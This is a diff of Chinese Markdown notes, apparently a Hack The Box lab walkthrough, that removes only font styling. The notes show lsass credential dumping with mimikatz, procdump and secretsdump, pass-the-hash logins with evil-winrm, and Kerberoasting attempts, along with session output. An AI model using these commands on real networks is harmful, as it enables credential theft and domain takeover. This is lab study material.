-##### <font style="color:rgb(13, 13, 13);">③ 在 mimikatz 里敲：</font>
+##### ③ 在 mimikatz 里敲：
 ```plain
 privilege::debug
 sekurlsa::logonpasswords
 ```
 
-<font style="color:rgb(13, 13, 13);">如果看到：</font>
+如果看到：
 
 ```plain
 Username : P00_ADM
 NTLM     : xxxxxxxxxxxxxxxxx
 ```
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">记下来</font>**
+👉 **记下来**
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">🥉</font><font style="color:rgb(13, 13, 13);"> 再兜底：procdump + 离线分析</font>
-##### <font style="color:rgb(13, 13, 13);">① dump lsass</font>
+#### 🥉 再兜底：procdump + 离线分析
+##### ① dump lsass
 ```plain
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
-##### <font style="color:rgb(13, 13, 13);">② 拉回 Kali</font>
+##### ② 拉回 Kali
 ```plain
 impacket-secretsdump -lsass lsass.dmp LOCAL
 ```
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> 第 3 步：用抓到的 DA 凭据打 DC</font>
-<font style="color:rgb(13, 13, 13);">假设你现在拿到了：</font>
+### ✅ 第 3 步：用抓到的 DA 凭据打 DC
+假设你现在拿到了：
 
-+ <font style="color:rgb(13, 13, 13);">用户：</font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">P00_ADM</font>**`
-+ <font style="color:rgb(13, 13, 13);">密码 或 NTLM</font>
++ 用户：`**P00_ADM**`
++ 密码 或 NTLM
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">方法 1：evil-winrm</font>
+#### 方法 1：evil-winrm
 ```plain
 evil-winrm -i <DC_IP> -u P00_ADM -p '<password>' -d intranet.poo
 ```
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">方法 2：Pass-the-Hash</font>
+#### 方法 2：Pass-the-Hash
 ```plain
 evil-winrm -i <DC_IP> -u P00_ADM -H <NTLM> -d intranet.poo
 ```
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">验证你已经通关：</font>
+#### 验证你已经通关：
 ```plain
 whoami
 hostname
 ```
 
-<font style="color:rgb(13, 13, 13);">你应该看到：</font>
+你应该看到：
 
 ```plain
 intranet\p00_adm
 DC
 ```
 
-<font style="color:rgb(13, 13, 13);">🎉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">域已沦陷</font>**
+🎉 **域已沦陷**
 
-## <font style="color:rgb(13, 13, 13);">实施</font>
+## 实施
 ```plain
 *Evil-WinRM* PS C:\Users\Administrator\Documents> query user
 query.exe : No User exists for *
@@ -2885,8 +2885,8 @@ Bye!
 
 ```
 
-## <font style="color:rgb(13, 13, 13);">Kerberoast</font>
-**有 SPN + 是 User + 不带**** **`**<font style="background-color:rgb(236, 236, 236);">$</font>**`** ****= Kerberoast**
+## Kerberoast
+**有 SPN + 是 User + 不带**** **`**$**`** ****= Kerberoast**
 
 ### 一、什么是 SPN（Service Principal Name）
 一句人话版：
@@ -3040,24 +3040,24 @@ User Cannot Change Password:
 FALSE
 ```
 
-### <font style="color:rgb(13, 13, 13);">① 它是</font><font style="color:rgb(13, 13, 13);"> </font>**User，不是 Computer**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">✅</font>
+### ① 它是 **User，不是 Computer** ✅
 ```plain
 Node Type: User
 SAM Account Name: p00_adm
 ```
 
-<font style="color:rgb(13, 13, 13);">✔</font><font style="color:rgb(13, 13, 13);"> Kerberoast</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">只能打 User</font>**<font style="color:rgb(13, 13, 13);">  
-</font><font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> Computer（</font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">$</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">结尾）直接忽略</font>
+✔ Kerberoast **只能打 User**  
+❌ Computer（`**$**` 结尾）直接忽略
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">② 它有</font><font style="color:rgb(13, 13, 13);"> </font>**SPN（这是 Kerberoast 的开关）**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">🔥</font>
+### ② 它有 **SPN（这是 Kerberoast 的开关）** 🔥
 ```plain
 Service Principal Names:
 cyber_audit/intranet.poo:443
 ```
 
-<font style="color:rgb(13, 13, 13);">这句是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">铁证</font>**<font style="color:rgb(13, 13, 13);">。</font>
+这句是 **铁证**。
 
 **有 SPN = Kerberos 会给你 TGS**
 
@@ -3065,38 +3065,38 @@ cyber_audit/intranet.poo:443
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">③ 它是</font><font style="color:rgb(13, 13, 13);"> </font>**Tier Zero / AdminCount = TRUE**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">💣</font>
+### ③ 它是 **Tier Zero / AdminCount = TRUE** 💣
 ```plain
 Tier Zero: TRUE
 Admin Count: TRUE
 ```
 
-<font style="color:rgb(13, 13, 13);">这意味着：</font>
+这意味着：
 
-+ <font style="color:rgb(13, 13, 13);">这是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">域级高权限账号</font>**
-+ <font style="color:rgb(13, 13, 13);">极可能是：</font>
-    - <font style="color:rgb(13, 13, 13);">Domain Admin</font>
-    - <font style="color:rgb(13, 13, 13);">或等价权限</font>
++ 这是 **域级高权限账号**
++ 极可能是：
+    - Domain Admin
+    - 或等价权限
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">只要密码一爆 = 直接拿域</font>**
+👉 **只要密码一爆 = 直接拿域**
 
 ---
 
-### <font style="color:rgb(13, 13, 13);">④ 密码特性非常“HTB 风格”</font><font style="color:rgb(13, 13, 13);">😈</font>
+### ④ 密码特性非常“HTB 风格”😈
 ```plain
 Password Never Expires: TRUE
 Password Last Set: 2018-05-11
 ```
 
-<font style="color:rgb(13, 13, 13);">翻译一下：</font>
+翻译一下：
 
-+ <font style="color:rgb(13, 13, 13);">8 年没换密码</font>
-+ <font style="color:rgb(13, 13, 13);">服务账号</font>
-+ <font style="color:rgb(13, 13, 13);">绑定 SPN</font>
++ 8 年没换密码
++ 服务账号
++ 绑定 SPN
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">99% 是弱口令 / 可爆</font>**
+👉 **99% 是弱口令 / 可爆**
 
-## <font style="color:rgb(193, 132, 1);background-color:rgb(249, 249, 249);">Invoke-Kerberoast</font><font style="color:rgb(56, 58, 66);background-color:rgb(249, 249, 249);">.ps1</font>
+## Invoke-Kerberoast.ps1
 ## 上传PowerView.ps1（失败）
 ```plain
 *Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../../tools/PowerSploit/Recon/PowerView.ps1 PowerView.ps1 
@@ -3196,19 +3196,19 @@ At line:1 char:1
 [X] No credentials are available in the security package
 ```
 
-> <font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">意思是：</font>**
+> 👉 **意思是：**
 >
-> **<font style="color:rgb(13, 13, 13);">当前 Windows 会话里</font>****<font style="color:rgb(13, 13, 13);"> </font>****没有任何 Kerberos TGT**
+> **当前 Windows 会话里**** ****没有任何 Kerberos TGT**
 >
-> **<font style="color:rgb(13, 13, 13);">所以</font>****<font style="color:rgb(13, 13, 13);"> </font>****Rubeus 没法向 KDC 要 TGS**
+> **所以**** ****Rubeus 没法向 KDC 要 TGS**
 >
-> **<font style="color:rgb(13, 13, 13);">👉</font>****<font style="color:rgb(13, 13, 13);"> Kerberoast 自然失败</font>**
+> **👉**** Kerberoast 自然失败**
 >
-> **<font style="color:rgb(13, 13, 13);">我们拿到的Administrator 是：</font>**
+> **我们拿到的Administrator 是：**
 >
-> + <font style="color:rgb(13, 13, 13);">本地管理员 / NTLM 登录</font>
-> + <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">不是域 Kerberos 交互登录</font>**
-> + <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 内存里没有 </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">krbtgt</font>**`<font style="color:rgb(13, 13, 13);"> 票据</font>
+> + 本地管理员 / NTLM 登录
+> + ❌ **不是域 Kerberos 交互登录**
+> + ❌ 内存里没有 `**krbtgt**` 票据
 >
 
 ```plain
@@ -3219,7 +3219,7 @@ Current LogonId is 0:0x840f5
 Cached Tickets: (0)
 ```
 
-**<font style="color:rgb(13, 13, 13);"></font>**
+****
 
 ## Invoke-Kerberoast.ps1
 ### Administrator
@@ -3243,16 +3243,16 @@ At C:\Users\Administrator\Documents\Invoke-Kerberoast.ps1:990 char:20
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
 
-<font style="color:rgb(13, 13, 13);">⚠️</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">Administrator ≠ 一定是域管理员</font>**
+⚠️ **Administrator ≠ 一定是域管理员**
 
-<font style="color:rgb(13, 13, 13);">很多靶机里：</font>
+很多靶机里：
 
-+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">Administrator</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">本地管理员</font>**
-+ <font style="color:rgb(13, 13, 13);">不属于</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">DOMAIN\Administrator</font>**`
++ `**Administrator**` 是 **本地管理员**
++ 不属于 `**DOMAIN\Administrator**`
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">Invoke‑Kerberoast 必须是域用户</font>**
+👉 **Invoke‑Kerberoast 必须是域用户**
 
-### <font style="color:rgb(13, 13, 13);">mssql</font>
+### mssql
 ```plain
 *Evil-WinRM* PS C:\Users\Public\Downloads> upload ../../tools/Invoke/Invoke-Kerberoast.ps1 Invoke-Kerberoast.ps1                                 
 Info: Uploading /home/kali/Desktop/htb/poo/../../tools/Invoke/Invoke-Kerberoast.ps1 to C:\Users\Public\Downloads\Invoke-Kerberoast.ps1                                     
